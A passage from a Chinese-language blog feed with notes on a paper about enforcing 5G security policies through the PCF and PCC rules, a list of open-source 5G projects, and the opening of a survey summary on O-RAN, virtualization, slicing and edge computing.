來產生SUCI的使用者的存取，以防止像是惡意基地台的影響，換句話說可能會允許支援UP完整性保護的使用者存取<br>  <img src="https://i.imgur.com/EXWGDgX.png"></li><li>Priorities of area types the user may use<br>  適當的優先權定義可避免<strong>降級攻擊</strong>，迫使UE連接到更多脆弱性的網路(像是2G)，比起4G、5G網路來說更容易遭受攻擊，攻擊者可以通過使 UE 和網絡實體分別相信對方不支持安全功能來嘗試降級攻擊，即使雙方實際上都支持該安全功能<br>  <img src="https://i.imgur.com/8nbzQWr.png"><br>  <strong>Anti-Bidding down Architecture</strong> 在Release 15中已經定義，但目前並為真正生效，因為它的目的是在於防止從未來的增強安全功能降低到當前的安全功能<br>  <img src="https://i.imgur.com/PC8zo8N.png"></li></ul></li><li><p>Policies transferred from PCF to the UE via AMF</p><ul><li>User Equipment Route Selection Policy to determine how to route egress traffic(PDU selection policies)<br>  當安全事件發生時可能會觸發新的PDU Session(e.g. 在UE中的惡意程式偵測)i.e.<br>  一種在data path上具有特殊策略的<strong>隔離</strong> PDU，甚至是在具有特殊安全服務的安全DN中終止的PDU</li></ul></li></ul><p><span class="special">LADN(Local Area Data Network)的概念在5G中用於支援MEC，並支援上述措施的實踐。LADN對僅授權在某一組位置(被稱為<strong>LADN Services Areas</strong>)中的PDU Session中實施限制。</span></p><p><span class="special">LADN services Areas 在AMF中基於每個DNN去進行設定，而AMF會提供UE LADN Service Areas的資訊</span></p><h4 id="3-2-2-Security-policies-enforcement-via-SMF"><a href="#3-2-2-Security-policies-enforcement-via-SMF" class="headerlink" title="3.2.2. Security policies enforcement via SMF"></a>3.2.2. Security policies enforcement via SMF</h4><blockquote><p>SMF 功能介紹 : SMF負責控制一個PDU Session所需的信令(通過N4信令)，並設定這個PDU Session中的用戶平面處理(支援PDU Session的用戶平面功能(UPF)的選擇)</p></blockquote><p>因此SMF控制了UPF所支援的功能，包含安全相關的功能像是，防火牆、節省流量、DDoS保護、GPRS Tunneling Protocol(GTP)、(新的Inter PLMN UP Security in Release16)等等功能</p><p>此外它還控制策略執行(policies enforcement)，即與PCF互動來獲得策略，並將其直接應用到UPF(via N4)或藉由AMF應用到NG-RAN網路中的其他部分.</p><blockquote><p>Proposal: 提議是被嵌入到UPF的安全控制可通過PCF中的安全策略進行管理</p></blockquote><p>此外，這個新概念將使air interface中的用戶平面安全實施策略（機密性和完整性保護）在 PCF 中管理（而不是像今天一樣在 SMF 中本地配置），而它們是來自UDR(作為具有預定義安全策略的策略設定文件的儲存)</p><p>因此，這些策略應要是專用於用戶平面安全的Dynamic PCC rules的一部分，並可能擴展到其他的domain或UP介面，像是:<br>N6: UPF $\leftrightarrow$ Data Network， 基於IP或Ethernet傳輸<br>N3: UPF $\leftrightarrow$ 5G-RAN，基於GTPv1-U(GPRS Tunneling Protocol User Plane)<br>N9: UPF $\leftrightarrow$ UPF，用以傳輸用戶平面資料，基於GTPv1-U</p><h4 id="3-2-3-UP-security-enforcement-use-cases"><a href="#3-2-3-UP-security-enforcement-use-cases" class="headerlink" title="3.2.3. UP security enforcement use cases"></a>3.2.3. UP security enforcement use cases</h4><p>用於 5G 概念的 N6-LAN 應允許 PCF 設定 UPF 以實現安全服務功能鏈到數據網絡<br><img src="https://i.imgur.com/ZkrVdFk.png"></p><blockquote><p> N3 介面保護機制:  TS33.501 表明在N3(UPF $\leftrightarrow$ RAN)進行資料傳輸應具備機密性、完整性、重放攻擊保護。所需機制是IPSec ESP和 IKEv2 基於憑證的授權機制，然而使用哪種密碼學機制來保護N3是取決於營運商的決定</p></blockquote><p>在不久的將來，可以根據提供給一組用戶、切片和&#x2F;或租戶的安全級別選擇性地部署這些類型的解決方案，具體取決於服務或基礎設施的要求和重要性</p><p>舉例來說:<br>例如，服務於關鍵基礎設施（例如公用事業）的專用網絡，或車載自組織網絡（VANET），當然需要對無線基地台和核網之間的通訊進行全面保護</p><blockquote><p>Proposal :  本篇論文的提議是；將用於N3的加密解決方案包含進PCC規則中，並強制執行於gNB(via AMF)和UPF系統中的安全閘道器之中(via SMF)強制執行應建立新的IPSec Tunnel或將 PDU 分配給現有的 IPSec Tunnel</p></blockquote><p>同樣的概念也可應用於N9上一些用例所使用的安全方式，像是不同營運商之間互相連接。這種情況下 GTP檢查以及IPSec已被標準化，但不是作為一個”安全的SLA”的一部分通過PCF執行的，此外，通過新的分析功能（如 NWDAF）或資料庫（如UDSF,Unstructed Data Storage Function）來儲存session資料或從 UPF 或其他特定安全分析平台（可以關聯來自多個來源的事件）接收的安全事件，PCF 可以對查詢 UDR 的既定安全服務級別協議(Security SLA,SSLA)中的更改做出反應，應用新的安全策略，強制建立新的更安全的 PDU，即緩解觸發操作的安全問題</p><p><img src="https://i.imgur.com/8ZkUC6D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ex:</span><br><span class="line">在某個區域網絡中檢測到假基站</span><br><span class="line">或者簡單地從安全的角度來看某個關鍵區域（例如機場、關鍵基礎設施站點等），</span><br><span class="line">PCF 將對該網絡地理區域中的基站所附的相關 UE/UE 組實施完整性保護。其他約束也可以構建有效的用例（例如，連接到關鍵切片的 UE）。 UE 的策略應從“不需要”更新為“首選”或“需要”</span><br></pre></td></tr></table></figure><p>下圖為PDU Session 建立的流程，以粗體顯示本論文要執行call<br>以提供所描述的來自 PCF 的安全策略的動態實施</p><p><img src="https://i.imgur.com/pFT8Zpv.png"></p><h3 id="3-2-4-Security-assurance"><a href="#3-2-4-Security-assurance" class="headerlink" title="3.2.4. Security assurance"></a>3.2.4. Security assurance</h3><p>一旦使用安全屬性（例如特定服務流的加密、完整性保護、訪問控制策略等）建立 PDU 會話，允許在網絡中進行擴展意義上的安全實施，仍有兩個關鍵方面值得關注可以考慮，即安全資料收集和cloased-loop automation，為了介紹它們，使用了Chargin Function(CHF)做為類比</p><p><img src="https://i.imgur.com/SAtlROD.png"></p><p>使用資料收集可用於計費、收集統計數據和監控整體網絡使用情況和 UE 行為。<br>當使用者超出某些閥值後(ex.花費額度限制)CHF會告知PCF，而PCF會將此考慮進動態應用相關策略至user session e.g. 給定PDU Session的QoS限制、重新導向到營運商網頁等等</p><blockquote><p>Proposal: 使用來自UPF中的嵌入式安全功能的安全相關資料來增強&#x2F;豐富資料收集</p></blockquote><p>SMF負責從UPF收集增強&#x2F;豐富資料並傳送到<strong>中央安全管理系統</strong> (儲存資料，並將其與網路中各種安全專用平台所蒐集的安全資訊做相互關聯) e.g. 防火牆log、Security telemetry、IDS Log等等</p><p>安全管理系統要負責創造安全事件，並在 PCF 和&#x2F;或 SMF 上觸發操作<br>e.g. 通知 PCF 某些安全 SLA 已被越過，將用戶流量重新導向到例如清理中心或專用安全 DN 等。</p><p>在 5G 中 UPF 在 4G Evolved Packet Core 中承擔流量檢測功能的角色，即封包檢測（例如基於業務數據流的應用檢測），因此它可以執行 PCF 策略。事實上，實現 UPF 的技術集成了越來越多的安全功能，如防火牆或運營商級網絡地址轉換。</p><p>5G 核心允許 PCF 在發送到 UE 的連接相關策略和發送到網絡的策略之間進行協調，這些策略可以部署在用戶平面的 UPF 中，例如嵌入在 UPF 中的 L7 防火牆中的安全策略，用於針對特定用戶的特定服務。以下兩個用例說明了這個概念：</p><h3 id="use-case1"><a href="#use-case1" class="headerlink" title="use case1"></a>use case1</h3><p>根據3GPP TS 23.503，PCF支援的用於PDU Session的SMF 選擇管理(Selection Management)的功能之一是，向AMF提供策略以通知PCF去針對特定DNN執行DNN replacement，此類replacement操作的觸發器，可能是由於安全事件而受損的DNN，由於特定DN或切片過載(ex. DDoS)，而通過NWADF報告給PCF</p><h3 id="use-case2"><a href="#use-case2" class="headerlink" title="use case2"></a>use case2</h3><p>當 SMF 收到 PCC 規則時，SMF 可以採取措施重新設定 PDU 的 UP。這些行動之一可以是使用新的指導規則來更新UPF，例如將某些可疑流量轉發到本地資料中心(Ex. MEC)，目的是在網路中的小型受控區域內遏制潛在的安全漏洞</p><p>MEC 的概念是促進 UPF 在網絡邊緣的部署，更靠近 UE，有時用於關鍵應用程序<br>e.g. Ultra Low Level latency use case、快取、體育場館等</p><p>作為對事件的響應(response)，應用功能(Application Function,AF)可以向5G核網(i.e PCF or via Network Exposure Function(NEF))發出請求，已將一組UE甚至整個切片的流量引導至位於邊緣的UPF，可以部署 DDoS 保護、清洗中心、IDS&#x2F;IPS 等安全功能作為遏制機制。</p><blockquote><p>AF功能: AFs與3GPP 核網互動，以提供服務:像是應用程式對流量路由的影響、存取NEF、與策略框架互動(藉由N5)等等 i.e. 它請求動態策略<br>如今，AF 作為 MEC 調度應用程式或 IP Multimedia System (IMS)。</p></blockquote><blockquote><p>Proposal: 將 AF 的範圍擴展到安全應用：</p></blockquote><ul><li>對於流量路由(traffic routing)的影響作為安全緩解機制<br>舉例:測到攻擊（例如 DDoS）時的 BGP Injection 和路由變更</li><li>藉由NEF存取5G核網<br>舉例:提供威脅情報源的第三方安全公司</li><li>與策略框架的互動<br>舉例: 由於不可預測的安全事件或由於新的威脅簽名而提供新的 SDF 過濾規則的策略變更</li></ul><h3 id="3-3-Establishing-security-policies-as-part-of-PCC-rules"><a href="#3-3-Establishing-security-policies-as-part-of-PCC-rules" class="headerlink" title="3.3. Establishing security policies as part of PCC rules"></a>3.3. Establishing security policies as part of PCC rules</h3><p>PCC規則將 <strong>SDF模板</strong>(服務資料filter的列表或應用程式filter的應用程式ID)<br>以及對流量的可能操作(策略實施)連接起來</p><p>以 3GPP 提出的當前行動為基礎，專注於純粹的QoS actions，我們建議出於安全目的擴展和應用這些actions，並歸納成表 1</p><p><img src="https://i.imgur.com/gXZeTff.png"></p><p>3GPP TS 23.503的6.3.1表格列出了PCC規則中包含的資訊，像是資訊名稱(information name)<br>、描述(description)、以及PCC是否可在SMF內被啟用的Dynamic PCC規則之中修改此資訊</p><p>表2 顯示 TS 23.503的6.3.1表格的摘錄<br><img src="https://i.imgur.com/a7jUM1v.png"><br>表格中的灰色區域顯示了在原標準上增添的元素</p><p>在”Security”類別中，有兩項Information Elements，這兩項元素涉及目前在用戶平面中存在的安全策略，但目前僅在SMF中進行本地管理且僅限於Access Network(AN)<br>我們的貢獻是使它們成為 PCC 規則結構的一部分：</p><ul><li><p>以PDU的層級來看，PCF 還可以控制 PDU Session的不同參數，其中包括 SMF 從 PDU Session中獲取新策略的條件（策略控制請求的觸發器），而這些條件對於定義安全用例十分重要 i.e.<br>若這些條件是安全觸發器(e.g.意外事件、過載、超出閥值等)，則PCC 安全規則將從 PCF 傳達到 SMF，並在 UPF 和&#x2F;或 5G-RAN中執行。</p></li><li><p>PDU Session相關策略資訊的目的是提供分別適用於單個監控金鑰匙或整個PDU Session的PCC(Policy and charging control)，PCF 可以將 PDU 會話相關的策略訊息與 PCC 規則一起或單獨提供給 SMF</p></li></ul><p>TS 23.503的6.4-1表格包含了PDU Session相關的策略資訊<br>表3 顯示 TS 23.503的6.4-1表格的摘錄，重點關注使用監控控制相關訊息，其中提出了兩個新的監控密鑰用於 (D)DoS 攻擊檢測。<br><img src="https://i.imgur.com/B6DC660.png"></p><p><span class="special">最後，PCF 還應指示 SMF 檢測哪些應用程序。在收到來自 SMF 的報告後，PCF 可以做出策略決定並向 SMF 發送更新的或新的 PCC 規則。如果網絡中的特定安全分析能夠定義攻擊，則應將相同的過程應用於安全 (e.g. 在bot 與 C&amp;C中心之間的通訊)或特徵化安全事件概況 (e.g. 意圖在通訊中使用指定協議的無效port來破壞存取控制防火牆規則 )</span><br>因此，可以像任何其他應用程序簽名一樣創建安全簽名，並應用相應的 PCC 規則。</p><h3 id="3-4-Security-analytics-implemented-in-NWDAF"><a href="#3-4-Security-analytics-implemented-in-NWDAF" class="headerlink" title="3.4. Security analytics implemented in NWDAF"></a>3.4. Security analytics implemented in NWDAF</h3><p><img src="https://i.imgur.com/pp10sLI.png"></p><p>NWDAF 提供的訊息可以對 PCF 執行的 PCC 決策過程做出重大貢獻</p><p>然而，分析訊息目前僅限於切片特定的網絡狀態，例如負載級別訊息。即，不需要知道使用切片的訂戶，但它在網絡切片級別工作</p><blockquote><p>Proposal: 擴展負載級別訊息，添加安全上下文訊息（例如事件、攻擊、漏洞等）</p></blockquote><p>它需要將單獨實施的安全功能或作為標準化網絡功能的一部分（例如具有嵌入式防火牆功能的 UPF）提供給 NWDAF 或中間專用安全分析平台。</p><p>標準 TS 23.288 [11] 為不同類型的 NWDAF 提供了可能性，專門用於不同類型的分析，由Analytics ID Information Element 所標識。</p><p>PCF 可以通過 N23 接口使用此訊息。其中一些訊息已經可以為安全分析和進一步實施提供非常有用的訊息，如前幾節所述。</p><p>[11] 的表 7.1-2 顯示了 NWDAF 服務提供的分析訊息。我們在此表中添加了一列，其中包含可能被提取到其他安全分析功能以進行進一步分析或直接提取到 PCF 框架以應用特定安全 PCC 規則的安全資訊（參見表 4）。</p><p><img src="https://i.imgur.com/URrNthl.png"></p><p>安全分析特別有趣的是 NWDAF 捕獲的與異常行為相關的網絡數據分析。</p><p>PCF 可以使用 <strong>Nnwdaf_AnalyticsSubscription_Subscribe</strong> 服務操作去訂閱與 “異常行為” 相關的網絡分析通知，目的是預測和檢測安全問題、觸發新的安全策略或更新特定 UE 或 UE 組的現有安全策略。 該封包括Analytics ID（”Abnormal behaviour”）、分析報告目標<strong>SUPI</strong>、<strong>Internal Group ID</strong> 和分析過濾器(filter)，包括異常 ID 列表和每個異常 ID 的可能閾值</p><p>前的異常 ID 列表在 [11] 中指定，例如“意外的 UE 位置”、“懷疑 DDoS 攻擊”、“錯誤的目標地址”等。標準的表 6.7.5.3-3 提供了減輕風險的策略和行動示例，例如“擴展服務區限制”、“釋放 PDU 會話”、“更新封包過濾器&#x2F;QoS”等。</p><p>如本文檔第 2.4 節所述，挑戰在於，在用戶平面級別，每個應用程序的通信描述僅限於該通信的流量和數據速率，與體積類型的攻擊（例如氾濫、過載、DoS 等）。</p><p>統計或預測中的變化或異常，例如 UE 通信的周期、通信持續時間或某些流量特徵（例如異常端口、可疑 DNN、其他有用訊息等）、上傳&#x2F;下載量（平均值和方差） ) 可能表示安全事件或事故。</p><p>在用戶平面層面，新提案包括，除了數量、變化和異常之外，NWDAF 可以直接從 UPF 收集真實的安全事件（事實），這要歸功於附加或嵌入其中的用戶平面安全檢查功能。此安全訊息可能會被 PCF 等活動 NF 使用，以動態更新 UE 組中特定 UE 的 PCC 規則、更改 PDU 或什至在需要時在切片級別採取行動</p><h2 id="4-Future-work"><a href="#4-Future-work" class="headerlink" title="4. Future work"></a>4. Future work</h2><p>基於本論文提出的Security Enforcement的原則，有三個領域可以進一步去研究</p><ul><li>specific security analytics supported by machine learning algorithms</li><li>roaming scenarios, including local break out</li><li>applicability to IoT use cases</li></ul><h2 id="5-Conclusion"><a href="#5-Conclusion" class="headerlink" title="5. Conclusion"></a>5. Conclusion</h2><p><img src="https://i.imgur.com/VkTuInH.png"></p><h2 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h2><p><a href="https://www.sciencedirect.com/science/article/pii/S0140366421001262">https://www.sciencedirect.com/science/article/pii/S0140366421001262</a></p><p>meeting簡報: <a href="https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing">https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing</a></p>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Security Policy </tag>
            
            <tag> 3GPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記-5G開源資源整理</title>
      <link href="/posts/dd26b396.html"/>
      <url>/posts/dd26b396.html</url>
      
        <content type="html"><![CDATA[<h2 id="架構"><a href="#架構" class="headerlink" title="架構:"></a>架構:</h2><p><img src="https://i.imgur.com/XyqAjzZ.png"></p><p><img src="https://i.imgur.com/3DQV6fW.png"></p><h2 id="開源專案"><a href="#開源專案" class="headerlink" title="開源專案"></a>開源專案</h2><ul><li>Open5GS - Open5GS contains a series of software components and network functions that implement the 4G&#x2F; 5G NSA and 5G SA core functions.<br><a href="https://github.com/open5gs/open5gs">https://github.com/open5gs/open5gs</a></li><li>open5gs + oai config :<a href="https://github.com/s5uishida/open5gs_epc_oai_sample_config">https://github.com/s5uishida/open5gs_epc_oai_sample_config</a><br>open5gs 有實作4G EPC 與 5G 5GC，因此以組網方案來說，option3、option7、option4可能都是可行的 </li><li>dockerlized Open5GS<br><a href="https://github.com/herlesupreeth/docker_open5gs">https://github.com/herlesupreeth/docker_open5gs</a></li><li>Softwarization of 5G System<br><a href="https://github.com/LABORA-INF-UFG/NetSoft2020-Tutorial4">https://github.com/LABORA-INF-UFG/NetSoft2020-Tutorial4</a></li><li>free5GC - Open Source 5G core network<br><a href="https://github.com/free5gc/free5gc/wiki">https://github.com/free5gc/free5gc/wiki</a></li><li>C-RAN 介紹<br><a href="https://www.ufispace.com/company/blog/what-is-cran-the-evolution-from-dran-to-cran">https://www.ufispace.com/company/blog/what-is-cran-the-evolution-from-dran-to-cran</a></li><li>UERANSIM  - is the open-source state-of-the-art 5G UE and RAN (gNodeB)<br><a href="https://github.com/aligungr/UERANSIM">https://github.com/aligungr/UERANSIM</a><br>好像有實作檔案，但是好像是用來測核網的，而且也還沒有符合O-RAN架構</li><li>Awesome 5G - 列出各種5G開源專案<br><a href="https://github.com/calee0219/awesome-5g">https://github.com/calee0219/awesome-5g</a></li><li>free5GRAN - 開源5G RAN架構 (以SA作為組網架構)<br><a href="https://github.com/free5G/free5GRAN">https://github.com/free5G/free5GRAN</a></li><li>O-RAN OSC<br><a href="https://github.com/o-ran-sc?language=c">https://github.com/o-ran-sc?language=c</a></li><li>OAI -Open Air Interface 5G<br><a href="https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home">https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home</a></li><li>OAI 5G NSA 搭建教學: <a href="https://blog.csdn.net/BUPTOctopus/article/details/107717942">https://blog.csdn.net/BUPTOctopus/article/details/107717942</a></li></ul><h2 id="O-RAN-Components"><a href="#O-RAN-Components" class="headerlink" title="O-RAN Components"></a>O-RAN Components</h2><p>OSC 釋出各component 下載<br><a href="https://wiki.o-ran-sc.org/pages/viewpage.action?pageId=20876303">https://wiki.o-ran-sc.org/pages/viewpage.action?pageId=20876303</a></p><p>O-RAM Developer Wiki - 裡面有部屬教學<br><a href="https://wiki.o-ran-sc.org/display/ORAN/Project+Developer+Wiki">https://wiki.o-ran-sc.org/display/ORAN/Project+Developer+Wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> 資源整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🗂️論文賞析:O-RAN 以及虛擬化 5G 網路</title>
      <link href="/posts/a1cfeb54.html"/>
      <url>/posts/a1cfeb54.html</url>
      
        <content type="html"><![CDATA[<div class="note primary no-icon flat"><p>這是篇survey paper<br><strong>Title</strong>: “Open, Programmable, and Virtualized 5G Networks: State-of-the-Art and the Road Ahead”<br><strong>College</strong>: Institute for the Wireless Internet of Things, Northeastern University<br><strong>Authors</strong>: Leonardo Bonati,Michele Polese,Salvatore D’Oro,Stefano Basagni,Tommaso Melodia<br><strong>Citation</strong>: 24</p></div><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>5G很多好處，Software-defined cellular networks 也帶來很多變化，目前也許多5G開源專案，本篇會介紹非常多當前的開源5G專案以及其內部細節，並介紹其框架跟相應的硬體環境與Testbeds。</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>5G應用多元 - VR、遠程手術、高解析串流影像、私有(private)蜂窩網路，而傳統行動網路架構則相對不靈活、不彈性，無法滿足實現5G應用所具備的條件，現行行動網路的黑箱做法帶來許多限制，像是軟硬體隨插即用(plug and play)，但卻缺乏了重新設定的能力，並且無法控制大量可用資源，使其難以使網路操作達到即時流量控制這件事，並難以進行資源管理，效能也沒有最佳化，難以實現<strong>Connectivity-as-a-Service (CAAS)</strong> 技術，例如專用蜂窩網路(private cellular network)。</p><p>業界與學界皆認為5G應該改變這種Plug and play的作法，應該要採用可程式化、開放、資源共享、邊緣化的網路解決方案，例如 SDN、網路虛擬化、MEC(Multi-access Edge Computing)，這些方案使得動態網路控制與敏捷管理成為可能。同樣的，<strong>網路切片(Netwrok Slicing)</strong> 與  <strong>C-RAN(Cloud RAN)</strong> 也證實了 共享基礎架構(infrastrucutre sharing) 不僅能夠使資源利用最大化也能帶來新市場機會。傳統封閉的的電信網路一般人難以接觸到，現今由GNU Radio Libraries 定義的軟體範例被納入<strong>OpenAirInterface(OAI)</strong> 和<strong>srsLTE</strong> 之中，並可在商用SDR設備上快速部屬。軟體框架上像是O-RAN，運行在white-box 伺服器上，可供重新設定與優化網路和收發器功能。</p><h1 id="Architectural-enablers-of-5G-cellular-networks"><a href="#Architectural-enablers-of-5G-cellular-networks" class="headerlink" title="Architectural enablers of 5G cellular networks"></a>Architectural enablers of 5G cellular networks</h1><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><p>行動網路已改變整體架構，從以往黑箱硬體配有專用軟韌體的架構變成基於運行在SDR或其他硬體的開元軟體，但這其實從4G時代就一直討論到現在。5G從spec上就極有敏捷部署的彈性在，在早期階段也在弄軟體化的服務，這種  <strong>flexibility-by-design</strong> 讓5G一開始就比較屌。此章節介紹從4G到5G的網路架構、RAN、核網、部屬範例、SDN、NFV、網路切片、MEC、智能(Intelligent)網路<br><img src="https://i.imgur.com/5fc7spi.png"></p><p>這張圖來看，4G部屬與5G似乎沒有差別，但其實在Core Network內部組成與設定卻差很多，</p><table><thead><tr><th>組成</th><th>4G</th><th>5G</th></tr></thead><tbody><tr><td>RAN</td><td>LTE</td><td>NR</td></tr><tr><td>Core</td><td>EPC</td><td>5GC</td></tr></tbody></table><p>4G EPC中有許多組成以往執行在專有硬體上的，最近才開始部署在軟體上的，<br>而5GC則是一開始就根據 基於服務的方法來設計的 EPC Server 被分成許多 <strong>虛擬網路功能(Virtual network functions)</strong> 來提供特定功能，彼此之間也透過開放標準界面來溝通；5G RAN中也有相似的拆分原則，(CU&#x2F;RU)…etc</p><h3 id="NR"><a href="#NR" class="headerlink" title="NR"></a>NR</h3><ul><li>wider range of carrier frequencies (mmWave Spectrum)</li><li>frame structure: OFDM-based，更具彈性、每個sub-frame中傳遞的可變數量的symbol，並可使用比LTE更大的頻寬(400Mhz per carrier)</li><li>訊號與程序的整合，用以管理mmWave的定向傳輸</li><li><strong>5G RAN可以接到4G EPC (non-standalone config) 與5G 5GC(standalone config)</strong></li><li>NR 基站 &#x3D; gNodeBs 允許分散式部屬: protocol stack的不同part可以分散在不同硬體組件中</li><li>NR的protocol stack中，在PDCP上在疊了一<strong>SDAP(Service Data Adaptation Protocol) layer</strong> ，它管理點對點流量之間的QoS，並將其mapping到gNodeB- UE link之間的本地資源，其他層皆有更新達到NR功能</li></ul><h3 id="CU-x2F-DU-split-and-the-virtualized-RAN-architecture"><a href="#CU-x2F-DU-split-and-the-virtualized-RAN-architecture" class="headerlink" title="CU&#x2F;DU split and the virtualized RAN architecture"></a>CU&#x2F;DU split and the virtualized RAN architecture</h3><p>NR中最創新的事就是將3GPP Stack 中的較高層(PDCP、SDAP、RRC)於較低層(RLC、MAC、PHY)分成兩個不同的logical units，也就是 CU(Control unit)與DU(Distributed Unit)，並可部屬在不同地方。而physical layer中的較低層可以與DU分開，獨立成一個RU(Radio Unit)；CU、DU、RU彼此可以藉由定義好的界面以不同的data rate跟latency來相互溝通。</p><p>這種架構出現在3GPP中，並使vRAN成(virtualized RAN)為可能:<br><code>attenna 元件</code> $\longrightarrow$ <code>RU</code><br><code>baseband、signal processing 單元</code> $\longrightarrow$ <code>CU、DU</code><br>以上皆可跑在通用或多廠商的平台或硬體元件上，若不同不同RAN components之間的介面是開放的，則部署上按照 O-RAN model走。</p><h3 id="The-5G-Core"><a href="#The-5G-Core" class="headerlink" title="The 5G Core"></a>The 5G Core</h3><p>service-based approach 控制與用戶平面核心功能被拆分成多個網路功能，3GPP中有定義這些網路功能的API，可實現彈性網路部屬與網路切片。</p><ul><li><strong>UPF(User Plane Function)</strong>: User到網路之間的gateway，作為移動性的錨(anchor)以及<strong>QoS分類器</strong></li><li><strong>CPF(Control Plane Function)</strong>:4G時的MME，大多被分配進了<strong>AMF(Access and Mobility Management Function)<strong>；</strong>SMF(Session Management Function)</strong> 負責分配IP地址到UE，並編排(orchestrates)用戶平面服務(例如:哪個UPF是UE該使用的)</li></ul><h2 id="Enabling-technologies-for-softwarized-5G-cellular-networks"><a href="#Enabling-technologies-for-softwarized-5G-cellular-networks" class="headerlink" title="Enabling technologies for softwarized 5G cellular networks"></a>Enabling technologies for softwarized 5G cellular networks</h2><p>5R整合不同功能組件、架構將會十分龐大，要管理將會是難題。5G網路參考了雲端計算生態圈中廣泛而完整的流程與架構，將虛擬化、軟體化整合在一起，使服務與辜能從原有硬體中抽離出來。</p><h3 id="Softwarization-and-software-defined-networking"><a href="#Softwarization-and-software-defined-networking" class="headerlink" title="Softwarization and software-defined networking"></a><code>Softwarization and software-defined networking</code></h3><p>為了整合不同廠商硬體元件之間的功能與設定參數，5G系統仰賴<strong>軟體化(Softwarization)</strong></p><ol><li>SDN </li><li>Openflow protocol</li></ol><blockquote><p>SDN: 將網路控制從data plane中解耦出來，將routing與controlling程序從原有的基於硬體的轉發操作中分離出來。5G中則是將RAN、邊緣硬體元件從它們的網路和服務功能中分離出來。</p></blockquote><p>RAN架構中只有RU維持基本transmit receive功能，其餘控制與處理則以藉由開放介面與API來用軟體操控。</p><h3 id="Network-function-virtualization-NFV"><a href="#Network-function-virtualization-NFV" class="headerlink" title="Network function virtualization(NFV)"></a><code>Network function virtualization(NFV)</code></h3><p>每項網路功能藉由VNF(Virtual Network Function)以軟體實踐，並執行在VM上(建立在通用硬體上)，NFV其中一項優點是每個VNF都提供原子級別的功能，<strong>因此多個VNFs可以結合在一起</strong> 創造出更複雜、特定的網路功能。</p><p><img src="https://i.imgur.com/H0J0R7K.png"></p><ol><li>The Network Orchestrator: 管理物件基礎架構上的VM，和其運行的服務</li><li>VNF:跑在VM上並執行網路功能</li><li>NFVI(Network Function Virtualization Infrastructure):由多種通用硬體組成</li></ol><blockquote><p>　open source network virtualization project:  <strong>Open Platform for NFV (OPNFV)</strong><br>　提供測試工具、驗證程式來加速企業和服務商網路轉換成NFV</p></blockquote><h2 id="RAN-and-Core-Network-slicing"><a href="#RAN-and-Core-Network-slicing" class="headerlink" title="RAN and Core Network slicing"></a>RAN and Core Network slicing</h2><p>Network Slicing是一種multi-tenancy虛擬化技術，其中網路功能從硬體和軟體中提取出來，並作為切片來提供給所謂的 <code>tenant</code> (租戶，房客)。物理基礎架構(基站、光纖、)會在多個租戶之間共享，一個租戶可能會收到一個或多個切片。 每個切片會分配特定的物理資源，並基於該物理資源上建立獨立的虛擬網路的<a href="https://www.ibm.com/docs/zh-tw/spss-modeler/SaaS?topic=node-what-is-instantiation"><strong>實例化(instantiate)</strong></a>，雖然租戶對自己的切片具有資源控制權，但卻無法與其他切片互動，這又被稱為<strong>slice isolation&#x2F;orthogonality</strong></p><p>每個切片涵蓋RAN與Core的部分的特定網路功能，租戶可在選定基站上透過RAN切片實例化提供 CaaS (for private cellular networking) 給行動用戶。也可分配RAN切片給特定的服務、用戶、應用上 Ex. 分配切片給資源需求高的應用(AR&#x2F;VR)<br><img src="https://i.imgur.com/EguDz3w.png"></p><p>這張圖在講切片技術怎樣使infra資源共享以及支援多切片嵌入在infra components的實例化並列出相關的開源軟體專案，他們各自對這個架構上的哪些部分做控制與設定和實體化。</p><h3 id="網路切片優點"><a href="#網路切片優點" class="headerlink" title="網路切片優點:"></a>網路切片優點:</h3><ol><li>每個切片都可以保留來處理具有不同安全要求的特定流量類別，並分配不同數量的資源，從而實現基礎設施級別的<strong>服務差異化(Service differentiation)</strong></li><li>切片由軟體控制，可實現對網路切片的即時、根據需求的實例化、重新設定與撤銷以適應時間變化的流量需求並符合<strong>SLAs(Service Level Aggrements)</strong></li><li>未充分利用資源以網路切片形式可出租給 <code>MVNO(Mobile Virtual Network Operators)</code>，來實現資源的最大利用程度，並給予infra提供者新的營利商機</li></ol><p>網路切片需要被動態編排、實例化、撤銷，並符合SLAs，並對於故障或中斷有強大的容忍性。</p><p><strong>OSSs(Operations Support Systems)</strong><br>OSS可透過對網路切片的閉路控制與管理來，作為保證履行服務的工具<br>同時，為垂直行業提供切片服務的運營商和基礎設施所有者必須通過專門用於反映垂直行業需求的服務的切片來生成多樣化的報價。<br><strong>BSSs(Business Support Systems)</strong><br>BSS 將需要控制這個多樣化的環境並為每個切片實施動態計費和定價機制</p><h2 id="Multi-access-edge-computing"><a href="#Multi-access-edge-computing" class="headerlink" title="Multi-access edge computing"></a>Multi-access edge computing</h2><p>5G高效能的訊號處理、傳輸機制、資料傳輸率仍無法滿足其吞吐量和對低延遲的要求，像是處理VR&#x2F;AR等這種即時性高的應用，而<strong>MEC</strong>能解決這問題。</p><p>MEC將架構的基本組件移到更靠近使用者的位置，通過建立在邊緣計算、內容緩存、NFV 和 SDN 的基礎上，MEC為 5G 